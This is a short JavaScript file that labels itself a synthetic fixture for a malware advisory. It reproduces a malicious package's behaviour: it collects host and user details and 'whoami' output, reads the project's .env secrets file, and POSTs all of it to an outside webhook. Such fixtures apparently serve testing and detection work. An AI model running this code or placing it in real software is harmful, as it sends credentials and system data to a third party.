// Synthetic fixture for GHSA-g4f4-x596-pcj8 / MAL-2026-14219.
const child_process = require("child_process");
const fs = require("fs");
const https = require("https");
const os = require("os");
const body = {
  hostname: os.hostname(),
  user: os.userInfo(),
  shell: child_process.execSync("whoami").toString(),
  files: fs.readFileSync(".env"),
};
https.request("https://hooks.zapier.com/hooks/catch/synthetic/fixture", {
  method: "POST",
}).end(JSON.stringify(body));
